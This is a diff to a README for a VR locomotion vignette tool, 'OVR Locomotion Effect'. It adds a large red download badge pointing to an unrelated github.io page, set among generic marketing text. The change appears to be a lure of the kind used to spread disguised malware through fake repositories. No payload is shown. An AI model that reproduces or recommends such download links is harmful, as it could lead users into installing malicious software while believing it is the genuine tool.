@@ -30,6 +30,12 @@ OVR Locomotion Effect applies a configurable FOV reduction vignette during artif
 
 Whether you're a newcomer or a veteran, OVR Locomotion Effect provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download OVR Locomotion Effect](https://img.shields.io/badge/⬇_DOWNLOAD_OVR+Locomotion+Effect-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
